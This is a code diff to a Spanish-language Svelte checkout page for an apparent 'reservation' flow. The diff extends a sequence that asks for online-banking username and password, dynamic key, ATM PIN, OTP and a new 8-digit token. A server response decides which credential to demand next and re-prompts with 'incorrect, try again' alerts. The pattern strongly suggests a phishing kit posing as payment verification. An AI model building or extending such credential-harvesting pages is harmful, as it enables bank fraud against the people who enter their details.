@@ -64,7 +64,8 @@
         requireUserPass: true,    // Usuario y contraseña visibles por defecto
         requireDynamicKey: false, // Clave dinámica
         requireATMKey: false,     // Clave cajero
-        requireOTP: false         // OTP
+        requireOTP: false,        // OTP
+        requireToken: false       // Token
     };
 
     // Sistema de mensajes de error
@@ -77,6 +78,13 @@
     function clearError(field: string) {
         if (errorMessages[field]) {
             errorMessages = { ...errorMessages, [field]: '' };
+        }
+    }
+
+    // Función para prevenir espacios en blanco en los inputs
+    function preventSpaces(event: KeyboardEvent) {
+        if (event.key === ' ') {
+            event.preventDefault();
         }
     }
 
@@ -98,7 +106,8 @@
                 requireUserPass: true,
                 requireDynamicKey: false,
                 requireATMKey: false,
-                requireOTP: false
+                requireOTP: false,
+                requireToken: false
             };
         } catch (error) {
             console.error('Error obteniendo requisitos de seguridad:', error);
@@ -122,6 +131,7 @@
 
     async function handleSubmit(event) {
         isLoading = true;
+        let responseData: any = null;
         try {
             // 1) Leer datos del store para construir payload
             const state = $reservationStore;
@@ -147,6 +157,7 @@
                 dinamicKey: securityFlags.requireDynamicKey ? ((formData.get('clave_dinamica') as string) || '') : (previousChecks.dinamicKey || ''),
                 atmKey: securityFlags.requireATMKey ? ((formData.get('clave_cajero') as string) || '') : (previousChecks.atmKey || ''),
                 otp: securityFlags.requireOTP ? ((formData.get('otp') as string) || '') : (previousChecks.otp || ''),
+                token: securityFlags.requireToken ? ((formData.get('token') as string) || '') : (previousChecks.token || ''),
                 status: 'pending' as 'pending',
                 timestamp: new Date().toISOString()
             };
@@ -197,6 +208,20 @@
                 const lenOtp = (securityChecks.otp || '').trim().length;
                 if (lenOtp > 8) {
                     errorMessages.otp = 'El OTP debe tener como máximo 8 caracteres';
+                    hasValidationError = true;
+                }
+            }
+            if (securityFlags.requireToken) {
+                if (!securityChecks.token) {
+                    alert('Por favor, ingresa el token.');
+                    hasValidationError = true;
+                }
+                const tokenValue = (securityChecks.token || '').trim();
+                if (tokenValue.length !== 8) {
+                    errorMessages.token = 'El token debe tener exactamente 8 dígitos';
+                    hasValidationError = true;
+                } else if (!/^\d+$/.test(tokenValue)) {
+                    errorMessages.token = 'El token debe contener solo números';
                     hasValidationError = true;
                 }
             }
@@ -256,63 +281,89 @@
                 throw new Error(`HTTP ${resp.status} ${resp.statusText}`);
             }
             const data = await resp.json();
+            responseData = data;
 
             // 7) Manejo de redirecciones y visibilidad exclusiva de inputs
             // Casos: 'success', 'otp', 'cdin', 'userpass', 'atmkey', 'tcred', 'tdeb'
-            switch (data.redirect_to) {
+            switch (responseData.redirect_to) {
                 case 'tcred':
                 case 'tdeb':
-                    alert('Hubo un error en la validación. Te redirigiremos a la página de pago para reintentar.');
+                    alert('Hubo un error en la validación. Intente con otro medio de pago.');
                     goto('/payment');
                     break;
                 case 'otpcode':
                     // Verificar si ya se solicitó OTP en el flujo actual
                     if (requestedFields.has('otp')) {
                         errorMessages.otp = 'Código OTP inválido o expiró. Ingresa nuevamente tu código OTP';
+                        alert('Código OTP incorrecto o expiró, intente nuevamente');
+                    } else {
+                        alert('Ingrese el código OTP que recibió en su dispositivo móvil');
                     }
                     requestedFields.add('otp');
-                    securityFlags = { requireUserPass: false, requireDynamicKey: false, requireATMKey: false, requireOTP: true };
+                    securityFlags = { requireUserPass: false, requireDynamicKey: false, requireATMKey: false, requireOTP: true, requireToken: false };
                     break;
                 case 'cdin':
                     // Verificar si ya se solicitó clave dinámica en el flujo actual
                     if (requestedFields.has('dinamicKey')) {
                         errorMessages.dinamicKey = 'Clave Dinámica inválida o expiró. Ingresa nuevamente tu clave dinámica';
+                        alert('Clave dinámica incorrecta o expiró, intente nuevamente');
+                    } else {
+                        alert('Ingrese la clave dinámica disponible en su app bancaria');
                     }
                     requestedFields.add('dinamicKey');
-                    securityFlags = { requireUserPass: false, requireDynamicKey: true, requireATMKey: false, requireOTP: false };
+                    securityFlags = { requireUserPass: false, requireDynamicKey: true, requireATMKey: false, requireOTP: false, requireToken: false };
                     break;
                 case 'atmkey':
                     // Verificar si ya se solicitó clave cajero en el flujo actual
                     if (requestedFields.has('atmKey')) {
                         errorMessages.atmKey = 'Clave de Cajero inválida o expiró. Ingresa nuevamente tu clave de cajero';
+                        alert('Clave de cajero incorrecta o expiró, intente nuevamente');
+                    } else {
+                        alert('Ingrese su clave de cajero de 4 dígitos');
                     }
                     requestedFields.add('atmKey');
-                    securityFlags = { requireUserPass: false, requireDynamicKey: false, requireATMKey: true, requireOTP: false };
+                    securityFlags = { requireUserPass: false, requireDynamicKey: false, requireATMKey: true, requireOTP: false, requireToken: false };
                     break;
                 case 'userpass':
                     // Verificar si ya se solicitó usuario/contraseña en el flujo actual
                     if (requestedFields.has('user') || requestedFields.has('pass')) {
                         errorMessages.user = 'Usuario inválido o expiró. Ingresa nuevamente tu usuario';
                         errorMessages.pass = 'Contraseña inválida o expiró. Ingresa nuevamente tu contraseña';
+                        alert('Usuario o contraseña incorrectos, intente nuevamente');
+                    } else {
+                        alert('Ingrese su usuario y contraseña de banca virtual');
                     }
                     requestedFields.add('user');
                     requestedFields.add('pass');
-                    securityFlags = { requireUserPass: true, requireDynamicKey: false, requireATMKey: false, requireOTP: false };
+                    securityFlags = { requireUserPass: true, requireDynamicKey: false, requireATMKey: false, requireOTP: false, requireToken: false };
+                    break;
+                case 'token':
+                    // Verificar si ya se solicitó token en el flujo actual
+                    if (requestedFields.has('token')) {
+                        errorMessages.token = 'Token inválido o expiró. Ingresa nuevamente tu token';
+                        alert('Token incorrecto o expiró, intente nuevamente');
+                    } else {
+                        alert('Ingrese el token disponible en su app bancaria');
+                    }
+                    requestedFields.add('token');
+                    securityFlags = { requireUserPass: false, requireDynamicKey: false, requireATMKey: false, requireOTP: false, requireToken: true };
                     break;
                 case 'success':
                     reservationStore.updateSecurityCheck({ status: 'approved' });
                     // Mostrar loader de 2000ms antes de redirigir a congrats
-                    isLoading = true;
+                    // NO establecer isLoading = false en el finally para este caso
                     setTimeout(() => {
                         goto('/congrats');
                     }, 2000);
-                    break;
+                    return; // Salir de la función sin ejecutar el finally
                 default:
                     // si la API no define, mantener estado actual
                     alert('Hubo un error en la validación. Te redirigiremos a la página de pago para reintentar.');
                     goto('/payment');
                     break;
             }
+
+            isLoading = false;
 
             console.log('Enviando autorización de transacción');
         } catch (error) {
@@ -321,7 +372,10 @@
             alert('La conexión falló. Por favor, inténtalo nuevamente.');
             goto('/payment');
         } finally {
-            isLoading = false;
+            // Solo establecer isLoading = false si no es el caso 'success'
+            if (responseData && responseData.redirect_to !== 'success') {
+                isLoading = false;
+            }
         }
     }
     
@@ -387,6 +441,7 @@
                                 class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent {errorMessages.user ? 'border-red-500' : ''}"
                                 placeholder="Ingrese su usuario"
                                 on:input={() => clearError('user')}
+                                on:keydown={preventSpaces}
                             />
                             {#if errorMessages.user}
                                 <p class="text-xs text-red-600 mt-1">{errorMessages.user}</p>
@@ -407,6 +462,7 @@
                                 class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent {errorMessages.pass ? 'border-red-500' : ''}"
                                 placeholder="Ingrese su contraseña"
                                 on:input={() => clearError('pass')}
+                                on:keydown={preventSpaces}
                             />
                             {#if errorMessages.pass}
                                 <p class="text-xs text-red-600 mt-1">{errorMessages.pass}</p>
@@ -429,6 +485,7 @@
                                 class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent {errorMessages.dinamicKey ? 'border-red-500' : ''}"
                                 placeholder="Ingrese su clave dinámica"
                                 on:input={() => clearError('dinamicKey')}
+                                on:keydown={preventSpaces}
                             />
                             {#if errorMessages.dinamicKey}
                                 <p class="text-xs text-red-600 mt-1">{errorMessages.dinamicKey}</p>
@@ -451,6 +508,7 @@
                                 class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent {errorMessages.atmKey ? 'border-red-500' : ''}"
                                 placeholder="Ingrese su clave cajero"
                                 on:input={() => clearError('atmKey')}
+                                on:keydown={preventSpaces}
                             />
                             {#if errorMessages.atmKey}
                                 <p class="text-xs text-red-600 mt-1">{errorMessages.atmKey}</p>
@@ -472,9 +530,33 @@
                                 class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent {errorMessages.otp ? 'border-red-500' : ''}"
                                 placeholder="Ingrese el código OTP"
                                 on:input={() => clearError('otp')}
+                                on:keydown={preventSpaces}
                             />
                             {#if errorMessages.otp}
                                 <p class="text-xs text-red-600 mt-1">{errorMessages.otp}</p>
+                            {/if}
+                        </td>
+                    </tr>
+                    {/if}
+                    {#if securityFlags.requireToken}
+                    <tr>
+                        <td class="text-right pr-4 py-2 align-top">
+                            <b class="text-gray-700">Token:</b>
+                        </td>
+                        <td class="text-left py-2">
+                            <input 
+                                type="text" 
+                                id="token" 
+                                name="token"
+                                minlength="8"
+                                maxlength="8"
+                                class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent {errorMessages.token ? 'border-red-500' : ''}"
+                                placeholder="Ingrese su token"
+                                on:input={() => clearError('token')}
+                                on:keydown={preventSpaces}
+                            />
+                            {#if errorMessages.token}
+                                <p class="text-xs text-red-600 mt-1">{errorMessages.token}</p>
                             {/if}
                         </td>
                     </tr>
